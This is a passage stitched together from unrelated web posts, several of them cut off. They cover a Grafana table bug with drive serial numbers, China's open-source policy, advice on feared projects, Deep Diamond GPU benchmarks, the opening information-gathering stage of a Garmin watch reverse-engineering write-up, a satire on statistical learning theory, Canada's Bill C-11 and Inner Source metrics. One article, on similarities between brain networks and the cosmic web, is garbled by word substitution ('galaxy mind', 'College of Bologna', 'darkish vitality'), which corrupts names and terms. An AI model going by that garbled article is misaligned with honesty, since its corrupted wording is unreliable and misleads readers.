queries. Also, this lets us easily look at the differences in SMART
metrics between two periods (not all of which are meaningful, of
course). One of the bits of 'SMART' data that we capture is drive
serial numbers and model names (and PCI paths). Recently I added a
Grafana table to display this to the dashboard, and when I did some
of the drive serial numbers displayed in the table as âˆž, the Unicode
infinity symbol.</p>

<p>At first I thought that the Prometheus query we were using had some
problem. Then I looked more closely at the actual serial numbers
in question, which were things like '1801E1098900', and the penny
dropped. Grafana was interpreting these as numbers written in
scientific notation (so '1801 E +1098900' here) and converting them
to extremely large floating point values, which it then displayed
as infinity. This didn't happen with all serial numbers for drives
of this sort, because most of the serial numbers had hex digits in
them other than the one 'E' that triggered parsing these as scientific
notation numbers.</p>

<p>(It was probably happening with some serial numbers that had the
'E' later, such as '17461934E396', but in those cases the result
was less obviously off than an infinity symbol.)</p>

<p>One of the reasons this was surprising to me was that these serial
numbers don't come from the Prometheus metric values, but instead
from labels on the metric. In Prometheus these labels are always
strings, so I tacitly expected Grafana to also always treat them
as strings. Instead Grafana guessed at their type, and apparently
was willing to accept a variation in type from row to row in the
table (since some didn't parse as floating point numbers but were
displayed without error). This is kind of what you want, but it
also kind of surprised me and I'll definitely have to remember it
for the future. <strong>In Grafana tables, it's safest to always set a
type for all rows</strong>.</p>

<p>In current Grafana (we're using 7.3.2 as I write this), the way to
deal with this is to set an explicit type for the table field, or
even for all fields if they're all really strings (as they are for
this table). In the table's editing interface, you want the 'Overrides'
tab over on the right and then a 'fields with name matching regex'
of '<code>.*</code>' and a 'Unit' of 'String', which is found in the 'misc'
section of units.</p>

Every time you stream your favorite TV show, whether it’s on Netflix or iQiyi, chances are you are firing up some cloud servers somewhere that run on Linux, an open source operating system. If you use a smartphone made by Samsung, Huawei or Xiaomi, it’s running on Android, another open source operating system for mobile devices.&nbsp;



Open source technology already permeates our digital lives, directly or indirectly. It’s also becoming an integral part of the industrial policy of countries seeking technological independence — from India and Israel to the UK and Japan. The most determined among them is China.



China’s accelerated push to become more technologically self-sufficient is likely fueled, in part, by its trade war with the U.S., and the export sanctions the U.S. has used against Huawei, ZTE and other Chinese technology firms. A core theme coming out of China’s most recent Fifth Plenum is scientific and technological self-reliance and self-improvement, with a </p>	</div><!-- .entry-content -->

<p>You should work on the projects you’re most afraid of starting.</p>



<p>Let me explain.</p>



<p>By making us avoid potential threats, fear has allowed us to survive and evolve for millennia. But now it’s kind of outdated.</p>



<p>Our brains haven’t been able to evolve at the same pace as our environment has changed. As a result, we suck at assessing and managing risks — we’re afraid of things we have no good reason to be afraid of.</p>



<p>When we think about starting a new project, we tend to overestimate the cost of failure. For our paleolithic brains, failing is equivalent to dying. That’s why it’s so terrifying.</p>



<p>But if you start that project you’re so afraid of and fail, you’ll be able to realize that it’s not so bad — yeah, failing sucks, but it doesn’t kill you.</p>



<p>When you understand that, starting new projects stops being so scary and starts being way more exciting.</p>

A few weeks ago I've shown you how simple Clojure's
<a href="https://github.com/uncomplicate/deep-diamond">Deep Diamond</a>() is, even compared to Keras. I've also mentioned
that it's superfast. Here's how fast it is on the GPU!
</p>

<div id="outline-container-orgc0a2ae3">
<h2 id="orgc0a2ae3">TL;DR Much faster than Keras+TensorFlow on the GPU, too!</h2>
<div id="text-orgc0a2ae3">
<p>
In the <a href="https://dragan.rocks/articles/20/Going-faster-than-TensorFlow-with-Clojure">previous article</a>, we have only compared the libraries on the CPU.
Deep Diamond was considerably faster: 368 seconds vs 509 seconds. Most readers were intrigued,
but, being skeptical as they should be, they complained that CPU performance doesn't matter
anyway, since everybody uses GPU for training convolution networks;
let's do the GPU comparison then.
</p>

<p>
Both Deep Diamond, and Keras with TensorFlow, use <a href="https://developer.nvidia.com/cudnn">Nvidia's cuDNN</a> low level performance
library under the hood, and any difference is due to the higher-level implementation.
</p>

<p>
Deep Diamond completes this training in <b>21</b> seconds while Keras + TensorFlow takes <b>35</b> seconds.
The gap even increased in favor of Deep Diamond! Now the ratio is <b>1.67</b>, in place of 1.38 on the CPU.

I recently bought a watch equipped with an array of sensors (and supporting microcontrollers) to record hikes, runs, and rides. The device, a Garmin Forerunner 235, is far from the most advanced piece of technology you can buy to perform these tasks but, so far, has performed well. My partner also has a Garmin watch and rushed to show me all of the customization options available via Garmin’s ConnectIQ Store and App. That's how this all started.</p><p>Here at Atredis Partners, I spend a good chunk of time under the delusion I'm a modern Sherlock Holmes. From the outside, I'm just a middle aged person lacking sleep and, evidently, the wherewithal to shave regularly. But, in my head, I'm hot on the trail of some computational mystery. Each engagement is a frantic sprint from layman to myopic expert. To give our customers the best assessment of their technology, we have to optimize where our time is spent. We need to understand the <em>system design </em>in order to evaluate tradeoffs between attack surface, impact, and complexity. The sooner we understand a technology, the more hours we have to allocate and arrange, Jenga-like, into a plan of attack. The more complete our understanding, the more accurate and complete our determination of impact and severity. When you spend your life understanding the most important (for some definition) parts of hundreds of devices in three week bursts of effort, every device looks like a new mystery to be solved.</p><p>Some people would spend their time away from these mental sprints actually hiking, running, or biking with their cool new watch (and I do that, sometimes). I, instead, needed to understand how this wrist-based computational cluster worked. To be precise, this project was driven by my curiosity, not by nascent privacy concern. This project wasn't an effort to point out all the security bugs or persuade you that balaclava-clad shadows are tracking your every movement. I make no privacy judgement either way -- you'll have to judge your own risk tolerance. Finally, I've enjoyed my Garmin watch and the company was easy to work with while reporting issues. This isn't an indictment of their products.</p><p><strong>TL;DR:</strong> I'm a nerd. I bought an exercise watch and promptly stopped exercising to tear it apart.</p><h2>Information Gathering</h2><h3>ConnectIQ</h3><p>All of this started with a casual mention that Garmin provides a third party app store, ConnectIQ (abbreviated as CIQ), for Garmin devices. CIQ consists of an app store (<a href="https://apps.garmin.com/en-US/" target="_blank">https://apps.garmin.com/en-US/</a>), a smart phone app to install CIQ Apps on your Garmin device, and a free software development kit (SDK) for developing CIQ Apps (<a href="https://developer.garmin.com/connect-iq/overview/" target="_blank">https://developer.garmin.com/connect-iq/overview/</a>). With my deerstalker on and a pipe firmly between my teeth, the link to the ConnectIQ SDK was the first note I took in my gumshoe notebook. As far as attack surface goes (even in our broader lens of overall system understanding), being able to run code on the device is hard to beat when it comes to tools for understanding a system.</p><h3>Firmware</h3><p>The firmware was the next clue, and this one was a gamble. Devices often have encrypted or "encrypted" (encoded with the intent to obfuscate) firmware. In this case, a quick web search turned up a community <a href="http://gawisp.com/perry" target="_blank">repository of installable firmware updates for Garmin devices</a> (repository is currently down). I jotted down the Forerunner 235 firmware in my  metaphorical steno pad.</p><h3>Hardware</h3><p>The firmware runs on some set of programmable devices within the watch. Without knowing which microcontrollers are included in the watch design, reversing is more difficult. Knowing the architecture and memory map of the system-on-chips (SoCs) used will provide more clues towards understanding how the firmware is loaded and executed. Having a bill-of-materials or some approximation of such is not a strict necessity, but provides a good reference going forward while taking apart the firmware. Another web search turned up a teardown for a similar device and the FCC images provided additional clues. These were also recorded in the notepad, providing another category of data to draw from.</p><h3>The Screaming Hoards</h3><p>Lastly and reluctantly, it’s time to check if anyone has stolen our fun. Has someone already written up their efforts at understanding a Garmin device? Some searching produced a very nice write up of a TomTom watch and a handful of file format reverse engineering. This is a considerably good outcome -- our fun hadn’t been cut off but we do have a head start on some of the artifacts we'll need to analyze. I took note of links to the firmware update format (<code>RGN</code>) and a GitHub repository related to the CIQ application format (<code>PRG</code>).</p><h2>Our Investigative Notes So Far</h2><h3>Device Hardware</h3><ul data-rte-list="default"><li><p>Teardown of 735XT: <a href="https://zh.ifixit.com/Teardown/Garmin+Forerunner+735XT+Teardown/117852" target="_blank">https://zh.ifixit.com/Teardown/Garmin+Forerunner+735XT+Teardown/117852</a></p></li></ul><h3>Datasheets (based on the 735XT teardown -- not sure about 235)</h3><ul data-rte-list="default"><li><p>Maxim MAX32630: <a href="https://pdfserv.maximintegrated.com/en/an/AN6349.pdf" target="_blank">https://pdfserv.maximintegrated.com/en/an/AN6349.pdf</a></p></li><li><p>ARM Cortex-M4: <a href="https://infocenter.arm.com/help/topic/com.arm.doc.ddi0439b/DDI0439B_cortex_m4_r0p0_trm.pdf" target="_blank">https://infocenter.arm.com/help/topic/com.arm.doc.ddi0439b/DDI0439B_cortex_m4_r0p0_trm.pdf</a></p></li><li><p>Atmel SAMG53G: <a href="https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11240-32-bit-Cortex-M4-Microcontroller-SAM-G53_Datasheet.pdf" target="_blank">https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11240-32-bit-Cortex-M4-Microcontroller-SAM-G53_Datasheet.pdf</a></p></li><li><p>Atmel SAMG51G: <a href="https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11209-32-bit-Cortex-M4-Microcontroller-SAM-G51_Datasheet.pdf" target="_blank">https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11209-32-bit-Cortex-M4-Microcontroller-SAM-G51_Datasheet.pdf</a></p></li><li><p>Maxim MAX14676: <a href="https://datasheets.maximintegrated.com/en/ds/MAX14676-MAX14676A.pdf" target="_blank">https://datasheets.maximintegrated.com/en/ds/MAX14676-MAX14676A.pdf</a></p></li><li><p>Nordic N51422: <a href="https://infocenter.nordicsemi.com/pdf/nRF51422_PS_v3.1.pdf" target="_blank">https://infocenter.nordicsemi.com/pdf/nRF51422_PS_v3.1.pdf</a></p></li><li><p>MTK MT3333: <a href="https://s3-ap-southeast-1.amazonaws.com/mediatek-labs-imgs/downloads/d54c0d5ffdffbc55f6c592c6a804d4f2.pdf" target="_blank">https://s3-ap-southeast-1.amazonaws.com/mediatek-labs-imgs/downloads/d54c0d5ffdffbc55f6c592c6a804d4f2.pdf</a></p></li><li><p>Macronix MX25U12835F: <a href="https://media.digikey.com/pdf/Data%20Sheets/Macronix/MX25U12835F.pdf" target="_blank">https://media.digikey.com/pdf/Data%20Sheets/Macronix/MX25U12835F.pdf</a></p></li></ul><h3>Development Kits</h3><ul data-rte-list="default"><li><p><a href="https://datasheets.maximintegrated.com/en/ds/MAX32630-EVKIT-MAX32631-EVKIT.pdf" target="_blank">https://datasheets.maximintegrated.com/en/ds/MAX32630-EVKIT-MAX32631-EVKIT.pdf</a></p></li></ul><h3>Device Firmware</h3><ul data-rte-list="default"><li><p>Firmware (at time of analysis): <a href="https://download.garmin.com/software/Forerunner235_790.gcd" target="_blank">https://download.garmin.com/software/Forerunner235_790.gcd</a></p></li><li><p>Firmware (patched per disclosure): <a href="https://www8.garmin.com/support/download_details.jsp?id=9575">https://www8.garmin.com/support/download_details.jsp?id=9575</a></p></li><li><p>Large archive: <a href="https://gawisp.com/perry/forerunner/" target="_blank">https://gawisp.com/perry/forerunner/</a></p></li><li><p>GCD firmware update format: <a href="https://www.memotech.franken.de/FileFormats/Garmin_GCD_Format.pdf" target="_blank">https://www.memotech.franken.de/FileFormats/Garmin_GCD_Format.pdf</a></p></li><li><p>Old IDA loader for Garmin: <a href="https://sourceforge.net/projects/garminidaloader/" target="_blank">https://sourceforge.net/projects/garminidaloader/</a></p></li></ul><h3>Host Tools</h3><ul data-rte-list="default"><li><p>Official Devkit: <a href="https://developer.garmin.com/connect-iq/" target="_blank">https://developer.garmin.com/connect-iq/</a></p></li><li><p>Monkey C Language: <a href="https://developer.garmin.com/connect-iq/monkey-c/" target="_blank">https://developer.garmin.com/connect-iq/monkey-c/</a></p></li><li><p>Presentation explaining why Monkey C: <a href="https://web.archive.org/web/20160823173012/https://developer.garmin.com/downloads/connect-iq/Wear%20Where%20Ware%20-%20Connect%20IQ%20and%20the%20wearable%20world.pdf" target="_blank">https://web.archive.org/web/20160823173012/https://developer.garmin.com/downloads/connect-iq/Wear%20Where%20Ware%20-%20Connect%20IQ%20and%20the%20wearable%20world.pdf</a></p></li><li><p>prg parser in Go: <a href="https://github.com/pzl/ciqdb" target="_blank">https://github.com/pzl/ciqdb</a></p></li></ul><h3>Similar Stuff</h3><ul data-rte-list="default"><li><p><a href="https://grangeia.io/2015/11/09/hacking-tomtom-runner-pt1/" target="_blank">https://grangeia.io/2015/11/09/hacking-tomtom-runner-pt1/</a></p></li></ul><h2>Moving on to Monkey C</h2><h3>The Game is Afoot</h3><p>With our initial flurry of web searches done, it was time to start somewhere. As I mentioned above, the ability to run your own code on the watch seems like a great place to start. Heading to the Garmin ConnectIQ site and reading more about the developer tools revealed that CIQ Apps are developed in a custom language called Monkey C. A custom language is surprising enough to require some follow-up research before diving into the actual SDK provided. The question at hand was: why did Garmin decide on a custom language?</p><p>Before unraveling that question, it’s important to take a glance at the language. As you can see below, the language appears to be made of JavaScript and Java.</p></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1605286709923_36192"><div>

<p>An astrophysicist and a neurosurgeon walked right into a room.</p>
<p>It might sound like the start of a nasty joke, however what a pair of Italian researchers got here up with is a very galaxy mind take: The buildings of the observable universe, they are saying, is astonishingly much like the neuronal networks of the human mind.</p>
<p>College of Bologna astrophysicist Franco Vazza and College of Verona neurosurgeon Alberto Feletti element the stunning similarities between the cosmic community of galaxies and the advanced net of neurons within the human mind exhibit in a <a href="https://www.frontiersin.org/articles/10.3389/fphy.2020.525731/full">new paper</a> printed within the journal <em>Frontiers in Physics</em>. Regardless of being roughly 27 orders of magnitude aside in scale, the human mind and the composition of the cosmic net present related ranges of complexity and self-organization, in response to the researchers.</p>
<p>The mind accommodates an estimated 69 billion neurons, whereas the observable universe consists of at the least 100 billion galaxies, strung collectively loosely like an online. Each precise galaxies and neurons solely account for&nbsp;about 30 % of the whole plenty of the universe and mind, respectively. And each galaxies and neurons prepare themselves like beads on lengthy strings or filaments.</p>
<p>Within the case of galaxies, the remaining 70 % of mass is darkish vitality. The equal within the human mind, the duo mentioned: water.</p>
<p>“We calculated the spectral density of each techniques,” Vazza mentioned in <a href="https://phys.org/news/2020-11-human-brain-resemble-universe.html">a statement</a> concerning the work. “This can be a method usually employed in cosmology for finding out the spatial distribution of galaxies.”</p>
<p>“Our evaluation confirmed that the distribution of the fluctuation throughout the cerebellum neuronal community on a scale from 1 micrometer to 0.1 millimeters follows the identical development of the distribution of matter within the cosmic net,” he added, “however, in fact, on a bigger scale that goes from 5 million to 500 million light-years.”</p>
<p>The clustering and variety of connections emanating from every node additionally had been oddly related.</p>
<p>“As soon as once more, structural parameters have recognized sudden settlement ranges,” Feletti mentioned within the assertion. “In all probability, the connectivity throughout the two networks evolves following related bodily ideas, regardless of the putting and apparent distinction between the bodily powers regulating galaxies and neurons.”</p>
<p>The crew is hoping that their preliminary examine may result in new evaluation strategies in each cosmology and neurosurgery, permitting scientists to higher perceive how these buildings have advanced over time.</p>

  <div itemprop="articleBody">
    <p>You’re a software testing engineer, working at a big tech company. While other
engineers on your team write code, your job is to make sure the code is safe
before you push it to production. Your goal isn’t to prove the code is
“correct,” but rather to assess the risk of potential failures to the company
and <a href="http://assets.cambridge.org/97811071/72012/excerpt/9781107172012_excerpt.pdf#page=8">test
accordingly</a>.
You mainly write tests that try to rule out known or suspected failure modes,
and you spend a lot of time thinking about edge cases.</p>

<p>One day, over your morning cup of coffee, you get an email from the other
engineers on your team. They’ve decided that writing source code is too hard, so
they’ve started <strong>randomly guessing</strong> program implementations until one meets
the specification. They call this wacky approach “<a href="https://medium.com/@karpathy/software-2-0-a64152b37c35">Software
2.0</a>” or something.</p>

<p>“Not to worry,” they tell you, “we can prove it works. You don’t even have to
write tests any more!” They go on to explain that there’s this book called
“<a href="https://en.wikipedia.org/wiki/Statistical_learning_theory#:~:text=Statistical%20learning%20theory%20is%20a,predictive%20function%20based%20on%20data.">Statistical Learning
Theory</a>,”
which describes a mathematical framework that <em>proves</em> Software 2.0 can give you
a correct implementation.</p>

<p>Intrigued, you ask them for more details.</p>



<p>First, they have to assume that any future user input will be similar to what
you’ve seen previously in production. They call this the
<a href="https://en.wikipedia.org/wiki/Independent_and_identically_distributed_random_variables">IID</a>
assumption.</p>

<p>“But what about hackers?” you ask. “and what happens when we change the UI?
People change their behaviour all the time! This week they’re Googling for
election results, but next week they’ll go back to Googling Kanye West…”</p>

<p>They concede that maybe you have a point, but they definitely
need this assumption to make it work. You begrudgingly let them continue.</p>



<p>Then they tell you there’s no specification. You ask them what the hell that means.</p>

<p>“Ok, hear us out,” they say. “The old spec was basically impossible to write.
There were too many edge cases! Our poor product manager didn’t even know where
to start, honestly.”</p>

<p>Instead, they decided to ask the product manager to write down a bunch of
example user inputs along with the correct output for each example. That would
serve as the defacto specification. They call this “training data.” Then they
guess a program that meets those requirements, using this thing called gradient
descent.</p>

<p>You mention that this reminds you of <a href="https://medium.com/dev-genius/dont-just-test-the-happy-path-e3fd565bad53">happy-path
testing</a>,
where you only write tests for things you expect without thinking about possible
failure modes. In this case the training examples test the happy paths. How do
you know there aren’t still edge cases and bugs lurking around?</p>

<p>That’s where the magic of STL kicks in, they say.</p>



<p>If you assume that future inputs look like past inputs, they say, then you can
also assume future performance will look like past performance! As long as you
<strong>have enough training data</strong>, there’s a low probability that you’ll encounter
edge cases. Basically, you want the happy paths to be the only paths.</p>

<p>“But how many examples do you need to make sure there aren’t any unhappy paths?”
you ask.</p>

<p>It depends on how complicated the program you’re guessing is, they say. If the
program is super complex and you don’t know anything about it, you basically
need to enumerate all the possible inputs. They’ve been calling this the “<a href="https://analyticsindiamag.com/what-are-the-no-free-lunch-theorems-in-data-science/">No
Free Lunch Theorem</a>.”</p>

<p>But if it’s “simple” somehow and you can use that to narrow down the possible
candidate programs, then you need way less data. That part sounds kind of
reasonable to you. It reminds you of having <a href="https://en.wikipedia.org/wiki/Code_coverage">branch
coverage</a> when writing unit tests.
If you have more branches, then you have to write more tests. Similarly, if you
have more possible candidate programs, then you need more data to make sure you
pick the right one.</p>



<p>“But wait,” you say, “what if you’re wrong about how the program you’re guessing
is simple? Isn’t the problem that you don’t know the right program in the
first place?”</p>

<p>They tell you you’re right, of course, and that there’s a trade-off. There are
different kinds of simplicity with different levels of strictness.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> If you
suppose the wrong kind of simplicity from the start, that puts a hard cap on how
well you can learn the program. They call this the <em>bias</em> or <em>approximation
error</em>. On the other hand, if you don’t assume anything at all, then you need
way more data. If you don’t have enough, then you might encounter <em>variance</em> or
<em>estimation error</em>.</p>

<p>The best case, of course, is when you don’t have to guess and you know the
correct implementation of the program you want to write. Then you would have
maximum correct bias and no variance.</p>

<p>You muse that the second best case would be to just label every possible input
so that you don’t have to assume anything. They tell you that’s usually impractical (the
poor product manager can only work so much) but in some cases you basically have
<a href="https://arxiv.org/abs/2005.14165">infinite data</a> and that’s exactly what they do.</p>



<p>“So let me get this straight,” you say.</p>

<ul>
  <li>
    <p>First, you assume that the future will look like the past.</p>
  </li>
  <li>
    <p>Next, you get somebody to write down a bunch of example inputs and
correct outputs which you use as the spec.</p>
  </li>
  <li>
    <p>Then, you make some assumptions about the program you’re trying to guess. If
you make the wrong assumptions, then you cap your maximum performance. But if
you don’t make any, you might accidentally overload your product manager.</p>
  </li>
  <li>
    <p>Finally, you guess a random program that fits the spec. As long as
you have enough data, you can guarantee you did the best you could with your
assumptions and that you probably won’t hit any edge cases.</p>
  </li>
</ul>

<p>They nod. You shake your head. “I don’t know guys, this seems kind of fishy. The
IID assumption is one thing, but we also have no idea how much the approximation error is, right?”</p>

<p>They shrug. “Look man, we just don’t want to write any code, ok? It’s too hard.”
You can understand the sentiment.</p>

<p>“Besides, we don’t ever really use STL in practice.”</p>

<p>“What?”</p>

<p>“Yeah, we just set aside some of the training data as a test set. If the program
we guess does good on the training data and the test set, we just assume it’s
good to go.”</p>

<p>“But what if your test set is bad?”</p>

<p>They shrug again. “We just do our best. Sometimes we <a href="https://www.aclweb.org/anthology/2020.acl-main.442/">craft test
sets</a> that look for
<a href="https://arxiv.org/abs/1912.12598">specific properties</a>.”</p>

<p>You nod knowingly. At the end of the day, you don’t write tests to prove
correctness. You write tests to show the <a href="http://assets.cambridge.org/97811071/72012/excerpt/9781107172012_excerpt.pdf#page=8">presence or absence of
bugs</a>
in a way that appropriately manages risk. Some things never change. You take a
sip of coffee and go back to writing unit tests, suspecting your colleagues
will join you in a few years.</p>

				<p>Canada’s privacy sector privacy law was born in the late 1990s at a time when e-commerce was largely a curiosity and companies such as Facebook did not exist. For years, the privacy community has argued that Canada’s law was <a href="https://www.michaelgeist.ca/2018/03/no-longer-fit-purpose-canadian-privacy-law-needs-update/">no longer fit for purpose</a> and that a major overhaul was needed. The pace of reform has been frustrating slow, but today Innovation, Science and Industry Minister Navdeep Bains introduced the <a href="https://parl.ca/DocumentViewer/en/43-2/bill/C-11/first-reading">Consumer Privacy Protection Act</a> (technically Bill C-11, the Digital Charter Implementation Act), which represents a dramatic change in how Canada will enforce privacy law. The bill repeals the privacy provisions of the current <a href="https://laws-lois.justice.gc.ca/eng/acts/p-8.6/index.html">Personal Information Protection and Electronic Documents Act (PIPEDA)</a> and will require considerable study to fully understand the implications of the new rules.</p>
<p>This post covers six of the biggest issues in the bill: the new privacy law structure, stronger enforcement, new privacy rights on data portability, de-identification, and algorithmic transparency, standards of consent, bringing back PIPEDA privacy requirements, and codes of practice. These represent significant reforms that attempt to modernize Canadian law, though some issues addressed elsewhere such as the right to be forgotten are left for another day. Given the changes – particularly on new enforcement and rights – there will undoubtedly be considerable lobbying on the bill with efforts to water down some of the provisions. Moreover, some of the new rules require accompanying regulations, which, if the battle over anti-spam laws are a model, could take years to finalize after lengthy consultations and (more) lobbying.</p>
<p><u>1.&nbsp;&nbsp;&nbsp; New Privacy Law Structure</u></p>
<p>The CPPA dispenses with the longstanding PIPEDA model to create a fresh start for privacy law. While many of the principles are the same, the PIPEDA approach of relying on the Canadian Standards Association’s Model Code for the Protection of Personal Information as Schedule 1 to the law combined with rules for enforcement in the act itself is gone. Instead, the CPPA features the same principles – and adds several more – directly within the law itself. This will require careful comparison, but it provides the opportunity to include greater detail within the law, rather than relying on the interpretations of the Privacy Commissioner of Canada. As noted below, the new structure also includes a new privacy tribunal, the Personal Information and Data Protection Tribunal. The Tribunal will play a key enforcement role by reviewing Commissioner decisions and issuing penalties for non-compliance.</p>
<p>It is worth noting that the new law brings a new purpose that emphasizes cross-border data transfers. The new purpose references “an era in which data is constantly flowing across borders and geographical boundaries and significant economic activity relies on the analysis, circulation and exchange of personal information.” Several of the new provisions reflect this new purpose.</p>
<p><u>2. &nbsp;&nbsp;&nbsp; New Enforcement Regime</u></p>
<p>It may be odd to start with how the law is enforced, but the CPPA’s biggest changes seek to address the fundamental flaw in the current law, namely the weak enforcement model. The bill proposes several key changes to address enforcement. First, the Privacy Commissioner of Canada will have order making power that will enable the office to order compliance with the law and to recommend significant penalties for failure to do so. The lack of order making power – the commissioner has long been limited to non-binding findings – has been a critical legal shortcoming.</p>
<p>Second, the order making power comes with the ability to recommend penalties that in some cases are the highest in the G7. The potential penalties for contravening the law is “is the higher of $10,000,000 and 3% of the organization’s gross global revenue in its financial year before the one in which the penalty is imposed.” Moreover, there are even tougher penalties in cases of violations for failing to comply with some of the security breach disclosure rules, data retention requirements, identifying someone using de-identified data (except in limited circumstances), or sanctioning a whistleblower. In those circumstances, the penalties can reach $25,000,000 or 5% of the organization’s gross global revenue.</p>
<p>Third, these penalties will be levied by a new Personal Information and Data Protection Tribunal. The Tribunal, which will feature between three and six members, will hear appeals of Privacy Commissioner of Canada orders. The hearings will be public and the decisions will also be made public. The Tribunal may impose penalties, including overruling the Privacy Commissioner’s order on penalties (in other words, it can increase or decrease penalties).</p>
<p>Fourth, the law also includes whisteblower provisions that protect employees that disclose alleged privacy non-compliance to the Privacy Commissioner of Canada. The Privacy Commissioner must keep the identity of the whistleblower secret and the employer is prohibited from sanctioning or penalizing the employee for having disclosed the concern.</p>
<p>Fifth, the law features a private right of action that will allow individuals to seek damages for loss or injury suffered due to a privacy violation. The private right of action is triggered once the Privacy Commissioner has made a finding of contravention of the law (in other words, individuals must first file a complaint with the commissioner) and the finding is either not appealed to the Tribunal or the Tribunal upholds the ruling. The action must be brought within two years of the rulings.</p>
<p><u>3.&nbsp;&nbsp;&nbsp; New Privacy Rights: Data Portability, De-Identification, and Algorithmic Transparency</u></p>
<p>The bill includes a new privacy right on data portability, which involves the potential for individuals to ask organizations to transfer their personal information to another organization. This is a significant issue in several sectors, notably open banking. The rule states:</p>
<p><i>Subject to the regulations, on the request of an individual, an organization must as soon as feasible disclose the personal information that it has collected from the individual to an organization designated by the individual, if both organizations are subject to a data mobility&nbsp; framework provided under the regulations.</i></p>
<p>While the regulations will be crucial, this is a good start on an important new right.</p>
<p>The bill also includes a new access right with respect to algorithms. The algorithmic transparency provision states:</p>
<p><i>If the organization has used an automated decision system to make a prediction, recommendation or decision about the individual, the organization must, on request by the individual, provide them with an explanation of the prediction, recommendation or decision and of how the personal information that was used to make the prediction, recommendation or decision was obtained.</i></p>
<p>The bill features important rules with respect to de-identification of personal information with very strong penalties on organizations that violate the new standards. De-identification has emerged as a major issue in the world of big data, with many organizations relying on de-identified data for a wide range of purposes. As the public battle over Sidewalk Labs in Toronto demonstrated, some object to any use of their data, even if de-identified. The law seeks to strike a balance:</p>
<p><i>An organization that de-identifies personal information must ensure that any technical and administrative measures applied to the information are proportionate to&nbsp; the purpose for which the information is de-identified and the sensitivity of the personal information.</i></p>
<p>This is very vague and will require regulations to fully understand how it will apply (and even then will likely result in complaints). The government has, however, created significant penalties for those that seek to try to identify an individual using de-identified data:</p>
<p><i>An organization must not use de-identified information alone or in combination with other information to identify an individual, except in order to conduct testing of the effectiveness of security safeguards that the organization has put in place to protect the information.</i></p>
<p>Violations of this provision may trigger the maximum penalties described above.</p>
<p><u>4.&nbsp;&nbsp;&nbsp; Standards of Consent</u></p>
<p>Consent sits at the heart of modern privacy law and the consent provisions in the CPPA are amongst the most important and likely most controversial. On the one hand, the law establishes clear requirements for consent with standards on what must be included in order to valid, the need for express consent (unless the organization can demonstrate that implied consent is appropriate in the circumstances), and a prohibition on making consent a requirement for a product or service beyond what is strictly necessary. Deceptive practices to obtain consent with false or misleading information renders the consent invalid and individuals can withdraw their consent at any time.</p>
<p>On the other hand, there are many exceptions to the general consent requirement. Some that either touch on consent for collection and/or disclosure and which often replicate PIPEDA include:</p>
<ul>
<li>a range of business activities including delivery of a product or service, due diligence, or system or network security</li>
<li>transferring the information to another service provider (presumably to complete a service the individual has contracted for, but the bill is vague)</li>
<li>de-identifying the personal information</li>
<li>research and development if the data is de-identified</li>
<li>proposed or completed business transactions</li>
<li>produced in the course of the individual’s employment</li>
<li>prevent of fraud</li>
<li>witness statements</li>
<li>disclosures to the organization’s lawyers</li>
<li>journalistic, artistic or literary purposes</li>
<li>investigations</li>
<li>law enforcement</li>
</ul>
<p>There is also an exception for consent if it is in the individual’s interest. This could arise in an emergency and the individual cannot …</p></div></div></div>

<p><em>This is the first of a series of two articles describing the reasoning and the steps behind the idea of correlating software product delivery process performance metrics with community health and collaboration metrics as a way to engage execution managers so their teams participate in Open Source projects and Inner Source programs.  </em>What you will read in these articles is an extension of a talk I gave at the event <a href="https://innersourcecommons.org/events/isc-fall-2020-agenda/" target="_blank" rel="noreferrer noopener">Inner Source Commons Fall 2020</a>.</p>



<p>Background</p>



<p>There is a very popular African proverb within the Free Software movement that says…</p>



<p>“<em>If you want to go fast, go alone. If you want to go far, go together.</em>“</p>



<p>Many of us used it for years to promote collaboration among commercial organizations over doing it internally in a fast way at the risk of reinventing the wheel, not following standards, reducing quality, etc.</p>

<p>The proverb describes an implicit <em>OR</em> relation between the traditional Open Source mindset, focused on longer term results obtained through extensive collaboration, and the traditional corporate mindset, where time-to-market is almost an obsession.</p>



<p>Early in my career I got exposed as manager (I do not code) to agile and a little later to Continuous Delivery. This second set of principles and practices had a big impact on me because of the tight and positive correlation that proposes between speed and quality. Until then, I had assumed that such correlation was negative, when one increases the other decreases or vice-versa.</p>



<p>During a long time, I also assumed unconsciously as truth the negative correlation between collaboration and speed. It was not until I started working in projects at scale when I became aware of such unconscious assumption and start question it first and challenging it later.</p>



<p>In my early years in Open Source I found myself many times discussing with executives and managers about the benefits of this “collaboration framework” and why they should adopt it. Like probably many of you, I found myself being more successful among executives and politicians than middle layer managers.</p>



<p>– “No wonder they are executives” I thought more than once back then.</p>



<p>But time prove me wrong once again.</p>



<p>Problem statement: can we go faster by going together?</p>



<p>It was not until later on in my career, when I could relate to good Open Source evangelists but specially good sales professionals. I learned a bit about how different groups within the same organization are incentivized differently and you need to understand those incentives to tune your message in a a way that they can relate to it.</p>



<p>Most of my arguments and those from my colleagues back then were focused on cost reductions and collaboration, on preventing silos, on shorten innovation cycles, on sustainability, prevention of vendor lock-in, etc. Those arguments resonate very well among those responsible for strategic decisions or those managers directly related with innovation. But they did not work well with execution managers, specially senior ones.</p>



<p>When I have been a manager myself in the software industry, frequently my incentives had little to do with those arguments. In some cases, either my manager’s incentives had little to do with such arguments despite being an Open Organization. Open Source was part of the company culture but management objectives had little to do with collaboration. Variables like productivity, efficiency, time-to-market, customer satisfaction, defects management, release cycles, yearly costs, etc., were the core incentives that drove my actions and those around me. </p>



<p>If that was the case for those organizations I was involved in back then, imagine traditional corporations. Later on I got engage with such companies which confirmed this intuition.</p>



<p>I found myself more than once arguing with my managers about priorities and incentives, goals and KPIs because, as Open Source guy, I was for some time unable to clearly articulate the positive correlation between collaboration and efficiency, productivity, cost reduction etc. In some cases, this inability was a factor in generating a collision that end up with my bones out of the organization.</p>



<p>That positive correlation between collaboration and productivity was counter-intuitive for many middle managers I know ten years ago. Still is for some, even in the Open Source space. Haven’t you heard from managers that if you want to meet deadlines do not work upstream because you go move slower? I’ve heard so many times that, as mentioned before, during years I believed it was true. It might at small scale, but at big scale, it is not necessarily true.</p>



